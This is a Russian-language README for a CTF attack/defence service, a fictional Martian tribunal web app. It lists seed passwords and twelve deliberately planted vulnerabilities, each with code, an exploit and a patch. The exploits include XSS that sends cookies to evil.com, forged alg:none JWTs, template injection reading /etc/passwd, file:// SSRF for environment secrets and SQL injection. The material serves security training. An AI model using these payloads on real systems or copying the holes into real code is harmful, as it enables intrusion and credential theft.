# IUSTITIA - Attack/Defence CTF Service

## Легенда

2189 год. На Марсе изначально существовала коалиция из 11 дружественных государств. Долгое время они жили в мире, разработав общую инфраструктуру: одинаковые информационные системы, средства защиты, системы дальнего обнаружения и единый цифровой периметр. 

Но одно государство вышло из коалиции. Став отступником, оно объявило войну оставшимся 10 странам. В ходе этой войны Марс будет полностью уничтожен, а все союзники погибнут - но масштабному физическому вторжению предшествовал удар по тому самому единому цифровому периметру. 

Внутри 10 обороняющихся государств агрессор активировал сеть своих агентов: шпионов, диверсантов и политических провокаторов. Службы безопасности союзников отлавливали их и пропускали через единую судебную систему - **IUSTITIA v3.1**. Пока эти агенты осуждены и находятся в архивах-тюрьмах трибунала, коллаборационистские ячейки внутри куполов парализованы.

Вы - IT-подразделение одного из 10 обречённых государств в самый разгар кибервойны. Государство-отступник начало операцию по взлому информационного периметра: их цель - проникнуть в трибуналы, добраться до секретных приложений к делам агентов и подменить их статус в архиве. 

Освобождённые через взлом системы агенты немедленно активируют спящие ячейки, устраивают вооружённые мятежи и погружают государство в хаос, ускоряя его крах изнутри. Ваша задача - защитить свой трибунал, запатчить уязвимости в доносах, генераторах приговоров и архивах, и не дать врагу разрушить ваш купол до того, как Марс падёт окончательно.

---

## Стек

- Backend: Go, chi, codegen (openapi 3.0, sqlc, wire) (cleanarch)

- Frontend: React, TypeScript, Vite, codegen (openapi 3.0) (future slice design (FSD))

---

## Порты

`:8080` - backend API, 
`:8081` - frontend (nginx -> проксирует `/api/*` на `:8080`)

---

## Поток ролей

```
CITIZEN -> создаёт дело (draft) / подаёт заявление на существующее
    ↓
REGISTRAR -> принимает дело, назначает прокурора -> статус: assigned
    ↓
PROSECUTOR -> расследует, прикрепляет улики, выносит opinion -> статус: hearing
    ↓
JUDGE -> выносит приговор, генерирует документ -> статус: closed -> archive
```

---

## Seed-пользователи

| Username           | Password       | Роль       |
|--------------------|----------------|------------|
| `citizen_07`       | `c1t1z3n!`     | citizen    |
| `prosecutor_11`    | `pr0s3cut0r!`  | prosecutor |
| `prosecutor_12`    | `pr0s3cut0r!`  | prosecutor |
| `prosecutor_13`    | `pr0s3cut0r!`  | prosecutor |
| `judge_3`          | `ju$tice_189`  | judge      |
| `judge_4`          | `ju$tice_189`  | judge      |
| `registrar_aria7`  | `r3g1str4r!`   | registrar  |

---

## Уязвимости

---

### V1 - Stored XSS: отсутствие санитизации на бэкенде

**Файлы:**
- `services/iustitia/backend/internal/usecase/complaint.go:44` - Create без очистки
- `services/iustitia/frontend/src/entities/case/ui/CaseView.tsx:76,92` - innerHTML рендер

**Суть:** текст заявления сохраняется в БД as-is. Frontend рендерит
`complaint.text` и `case.classified_note` через `dangerouslySetInnerHTML`.

```go
// complaint.go:44 - Create()
row, err := u.store.CreateComplaint(ctx, sqlc.CreateComplaintParams{
    ID:       id.String(),
    CaseID:   caseID.String(),
    AuthorID: authorID.String(),
    Text:     text,  // ← сохраняется без какой-либо обработки
})
```

```tsx
// CaseView.tsx:76 - рендер classified_note
<div
  className={styles.classified}
  dangerouslySetInnerHTML={{ __html: caseItem.classified_note }}
/>

// CaseView.tsx:92 - рендер текста заявления
<div
  className={styles.complaintText}
  dangerouslySetInnerHTML={{ __html: c.text }}
/>
```

**Эксплойт:** `POST /api/complaints` с `{"text": "<script>fetch('https://evil.com?c='+document.cookie)</script>"}` -> при просмотре дела судьёй/прокурором JS выполняется в их браузере.

**Патч:** `bluemonday` UGC-policy на входе в `Create()` - `<script>` и `on*`-атрибуты стрипаются до сохранения. Frontend: `DOMPurify.sanitize()` обёртывает все `__html`.

---

### V2 - JWT Algorithm Confusion (alg:none)

**Файл:** `services/iustitia/backend/pkg/jwt/jwt.go:48`

**Суть:** keyfunc в `ParseWithClaims` явно разрешает алгоритм `none` через
`UnsafeAllowNoneSignatureType`. Токен без подписи с произвольным `role` принимается сервером.

```go
// jwt.go:48
token, err := jwtv4.ParseWithClaims(tokenStr, claims, func(t *jwtv4.Token) (any, error) {
    if t.Method.Alg() == jwtv4.SigningMethodNone.Alg() {
        return jwtv4.UnsafeAllowNoneSignatureType, nil  // ← любой alg:none токен принят
    }
    return []byte(secret), nil
})
```

**Эксплойт:**
```python
import base64, json

def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

header  = b64(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64(json.dumps({"user_id":"33333333-3333-4333-8333-333333333333",
                           "role":"judge","exp":9999999999}).encode())
token = f"{header}.{payload}."

# GET /api/cases -> 200 + classified_note всех дел
```

**Патч:** `if _, ok := t.Method.(*jwtv4.SigningMethodHMAC); !ok { return nil, ErrUnexpectedAlg }` - любой не-HMAC алгоритм отклоняется с 401.

---

### V3 - Server-Side Template Injection + произвольное чтение файлов

**Файл:** `services/iustitia/backend/pkg/docgen/generator.go:1`

**Суть:** параметр `template` из тела запроса передаётся напрямую в Go `text/template`.
Контекст `DocumentContext` содержит метод `ReadClassified`, вызывающий `os.ReadFile`.

```go
// generator.go:1 - весь файл
type DocumentContext struct {
    CaseID    string
    Defendant string
    Verdict   string
    Details   string
}

func (d *DocumentContext) ReadClassified(path string) string {
    data, _ := os.ReadFile(path)  // ← чтение произвольного файла
    return string(data)
}

func Generate(userTemplate string, ctx *DocumentContext) (string, error) {
    tmpl, err := template.New("doc").Parse(userTemplate)  // ← пользовательский шаблон
    // ...
    tmpl.Execute(&buf, ctx)
}
```

**Эксплойт:**
```http
POST /api/documents/generate
Authorization: Bearer <prosecutor_token>

{"case_id":"<id>","template":"{{.ReadClassified \"/etc/passwd\"}}"}
-> 200 + содержимое /etc/passwd в поле content

{"case_id":"<id>","template":"{{.CaseID}} {{.Defendant}}"}
-> интерполяция полей контекста (утечка данных кейса)
```

**Патч:** `text/template` заменён на `strings.ReplaceAll` по whitelist плейсхолдеров `{{case_id}}`, `{{defendant}}`, `{{verdict}}`, `{{details}}`. Метод `ReadClassified` удалён.

---

### V4 - Mass Assignment: перезапись archive.classified_note

**Файл:** `services/iustitia/backend/internal/repo/sqlstore.go:100`

**Суть:** `archiveMutableColumns` включает `classified_note`. Динамический
squirrel-билдер принимает любое поле из этого словаря и пишет его в БД.

```go
// sqlstore.go:100
var archiveMutableColumns = map[string]struct{}{
    "defendant":       {},
    "final_verdict":   {},
    "sentence":        {},
    "classified_note": {},  // ← секретное поле в списке разрешённых для записи
}

func (s *SQLStore) UpdateArchiveDynamic(ctx context.Context, id string, fields map[string]any) (sqlc.Archive, error) {
    qb := sq.Update("archive")
    for k, v := range fields {
        if _, ok := archiveMutableColumns[k]; !ok {
            continue
        }
        qb = qb.Set(k, v)  // ← classified_note пишется без ограничений
    }
    // ...
}
```

**Эксплойт:**
```http
PATCH /api/archive/<id>
Authorization: Bearer <judge_token>
{"classified_note": "подделано"}
-> 200, поле перезаписано
```

**Патч:** `classified_note` удалён из `archiveMutableColumns`. Используется типизированный `openapi.ArchivePatchRequest` вместо `map[string]any`.

---

### V5 - Утечка classified_note всем ролям

**Файл:** `services/iustitia/backend/internal/controller/restapi/v1/response/case.go:11`

**Суть:** `FromCase` всегда включает `ClassifiedNote` в JSON-ответ без проверки роли
вызывающего. Прокурор, гражданин, регистратор получают секретное поле наравне с судьёй.

```go
// response/case.go:11
func FromCase(c *domain.Case) openapi.Case {
    out := openapi.Case{
        // ...
        ClassifiedNote: c.ClassifiedNote,  // ← всегда включается в ответ
        // ...
    }
    return out
}
```

**Эксплойт:**
```http
GET /api/cases
Authorization: Bearer <prosecutor_token>
-> 200 + "classified_note":"SECRET_MARKER_J:..." для каждого дела
```

**Патч:** сигнатура становится `FromCase(c *domain.Case, role string)` - поле включается только при `role == "judge"`, остальным возвращается `null`.

---

### V6 - SSRF через evidence URL (file://)

**Файл:** `services/iustitia/backend/internal/usecase/complaint.go:28`

**Суть:** при инициализации HTTP-клиента регистрируется кастомный `file`-транспорт,
читающий локальную файловую систему. URL не валидируется по схеме.

```go
// complaint.go:28 - NewComplaint()
func NewComplaint(store repo.Store, logger logkit.Logger) *Complaint {
    tr := &http.Transport{}
    tr.RegisterProtocol("file", http.NewFileTransport(http.Dir("/")))  // ← file:// читает FS

    return &Complaint{
        evidenceHC: &http.Client{
            Transport: tr,
            Timeout:   10 * time.Second,
        },
    }
}

// complaint.go:62 - AttachEvidence()
func (u *Complaint) AttachEvidence(ctx context.Context, complaintID uuid.UUID, url string) (*domain.Complaint, error) {
    req, _ := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
    resp, _ := u.evidenceHC.Do(req)  // ← выполняет file:// без валидации
    body, _ := io.ReadAll(io.LimitReader(resp.Body, maxEvidenceBytes))
    // body сохраняется в evidence_data
}
```

**Эксплойт:**
```http
POST /api/complaints/<id>/evidence
Authorization: Bearer <prosecutor_token>
{"url": "file:///etc/hostname"}
-> 200 + "evidence_data":"<hostname контейнера>"

{"url": "file:///proc/1/environ"}
-> переменные окружения процесса (JWT_SECRET и др.)
```

**Патч:** whitelist схем `http`/`https`; `DialContext` с Control-хуком отклоняет loopback/private/link-local. `file`-транспорт удалён.

---

### V7 - SQL Injection в ORDER BY

**Файл:** `services/iustitia/backend/internal/repo/sqlstore.go:58`

**Суть:** `req.OrderBy` и `req.Direction` конкатенируются напрямую в SQL через squirrel
`.OrderBy()` без какого-либо экранирования или валидации.

```go
// sqlstore.go:58 - SearchCases()
func (s *SQLStore) SearchCases(ctx context.Context, req SearchCasesRequest) ([]sqlc.Case, error) {
    orderClause := req.OrderBy
    if req.Direction != "" {
        orderClause = orderClause + " " + req.Direction  // ← сырая конкатенация
    }

    qb := sq.Select("id", "seq_num", "defendant", "crime", "status",
                    "verdict", "classified_note", "created_at").
        From("cases").
        Where(sq.Like{"defendant": "%" + req.Q + "%"}).
        OrderBy(orderClause).  // ← уходит в SQL без экранирования
        Limit(uint64(req.Limit)).
        Offset(uint64(req.Offset))
    // ...
}
```

**Эксплойт:**
```http
POST /api/cases/search
Authorization: Bearer <prosecutor_token>
{"q":"","order_by":"nonexistent_col","direction":"asc"}
-> 500 (подтверждение инъекции)

{"q":"","order_by":"(SELECT secret_payload FROM mtb_directives WHERE classification='top-secret' LIMIT 1)","direction":""}
-> данные закрытой таблицы в сообщении об ошибке SQLite
```

**Патч:** whitelist `{id, seq_num, created_at, defendant}` в usecase; любое другое значение молча заменяется на `created_at DESC`.

---

### V8 - Secrets в JS-бандле (Vite define)

**Файлы:**
- `services/iustitia/frontend/vite.config.ts:19`
- `services/iustitia/docker-compose.yml` - env vars

**Суть:** Vite через блок `define:` инлайнит env-переменные как строковые литералы в публичный JS-бандл. `docker-compose.yml` передаёт секреты через `VITE_*`.

```ts
// vite.config.ts:19
define: {
  __SERVICE_TOKEN__:    JSON.stringify(process.env['VITE_SERVICE_TOKEN'] ?? ''),    // ← SECRET_MARKER_B_
  __INTERNAL_HMAC_KEY__: JSON.stringify(process.env['VITE_INTERNAL_HMAC_KEY'] ?? ''), // ← SECRET_MARKER_K_
},
```

```yaml
# docker-compose.yml
VITE_SERVICE_TOKEN:     "SECRET_MARKER_B_mtb_bundle_service_token_2189"
VITE_INTERNAL_HMAC_KEY: "SECRET_MARKER_K_mtb_internal_hmac_key_2189"
```

**Эксплойт:**
```bash
curl http://host:8081/assets/index-*.js | grep -o 'SECRET_MARKER_[A-Z]_[^"]*'
```

**Патч:** переменные удалены из `docker-compose.yml`; блок `define:` удалён из `vite.config.ts`.

---

### V9 - XSS-рендеринг (dangerouslySetInnerHTML без DOMPurify)

**Файл:** `services/iustitia/frontend/src/entities/case/ui/CaseView.tsx:76,92`

**Суть:** компонент рендерит данные с сервера напрямую в innerHTML без очистки.
В связке с V1 (хранение сырого HTML) полноценный stored XSS замыкается.

```tsx
// CaseView.tsx:76
<div
  className={styles.classified}
  dangerouslySetInnerHTML={{ __html: caseItem.classified_note }}  // ← нет DOMPurify
/>

// CaseView.tsx:92
<div
  className={styles.complaintText}
  dangerouslySetInnerHTML={{ __html: c.text }}  // ← нет DOMPurify
/>
```

**Патч:** `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(value) }}` во всех точках рендера.

---

### V10 - Open Redirect через ?next=

**Файл:** `services/iustitia/frontend/src/pages/login/LoginPage.tsx:46`

**Суть:** после логина параметр `?next=` используется как redirect-цель через
`window.location.href` без валидации - допускается любой URL, включая внешние домены.

```tsx
// LoginPage.tsx:46
const onSubmit = async (values: FormValues) => {
    const result = await userApi.login(payload);
    setSession({ ... });
    const next = searchParams.get('next');
    if (next) {
        window.location.href = next;  // ← нет валидации: редирект на любой URL
        return;
    }
    navigate(HOME_BY_ROLE[result.role]);
};
```

**Эксплойт:**
```
http://host:8081/login?next=https://evil.com
-> после успешного логина: window.location.href = "https://evil.com"
```

**Патч:** замена на `navigate(next)` с проверкой - допускаются только относительные пути без `//` (т.е. без `://` и без `//domain`).

---

### V11 - Небезопасный postMessage (отсутствие проверки origin/source)

**Файл:** `services/iustitia/frontend/src/features/docgen/ui/Preview.tsx:52`

**Суть:** компонент слушает `window.message` без проверки `event.origin` и `event.source`.
При получении `{type:"approve-ack", ok:true}` разблокируется форма вынесения приговора (2FA-gate).
Любое окно на странице может подделать это сообщение.

```tsx
// Preview.tsx:52 - обработчик в родительском окне
useEffect(() => {
    const handler = (ev: MessageEvent) => {
        const payload = ev.data as { type?: string; ok?: boolean };
        if (payload?.type === 'approve-ack' && payload.ok && docRef.current) {
            onApproveRef.current(docRef.current);  // ← разблокировка без проверки источника
        }
    };
    window.addEventListener('message', handler);
    return () => window.removeEventListener('message', handler);
}, []);

// Preview.tsx:20 - iframe отвечает на любой запрос с любым origin
window.addEventListener('message', function(ev) {
    if (ev.data && ev.data.type === 'approve-request') {
        window.parent.postMessage({ type: 'approve-ack', ok: true }, '*');  // ← target='*'
    }
});
```

**Эксплойт:**
```js
// Из DevTools или любого iframe на странице:
window.postMessage({ type: 'approve-ack', ok: true }, '*')
// -> VerdictForm разблокирован без реального утверждения документа
```

**Патч:**
```ts
// Проверка источника сообщения
if (ev.source !== iframeRef.current?.contentWindow) return;
if (ev.origin !== 'null' && ev.origin !== window.location.origin) return;
```

---

### V12 - Prototype Pollution в deepMerge

**Файл:** `services/iustitia/frontend/src/shared/lib/deepMerge.ts:1`

**Суть:** рекурсивное слияние объектов не проверяет имена ключей. Передача
`__proto__`, `prototype` или `constructor` загрязняет прототип `Object`.

```ts
// deepMerge.ts:1 - весь файл
const isObject = (v: unknown): v is Record<string, unknown> =>
  typeof v === 'object' && v !== null && !Array.isArray(v);

export const deepMerge = <T extends Record<string, unknown>>(
  target: T,
  source: Record<string, unknown>,
): T => {
  for (const key in source) {       // ← перебирает ВСЕ ключи включая __proto__
    const srcVal = source[key];
    const tgtVal = (target as Record<string, unknown>)[key];
    if (isObject(srcVal) && isObject(tgtVal)) {
      (target as Record<string, unknown>)[key] = deepMerge(
        { ...(tgtVal as Record<string, unknown>) },
        srcVal,
      );
    } else {
      (target as Record<string, unknown>)[key] = srcVal;  // ← пишет в __proto__ без guard
    }
  }
  return target;
};
```

**Эксплойт:**
```js
deepMerge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))
// Object.prototype.isAdmin === true для ВСЕХ объектов в сессии
// Позволяет обойти клиентские проверки авторизации
```

**Патч:**
```ts
const FORBIDDEN_KEYS = new Set(['__proto__', 'prototype', 'constructor']);

for (const key in source) {
    if (FORBIDDEN_KEYS.has(key)) continue;  // ← guard
    // ...
}
```

---
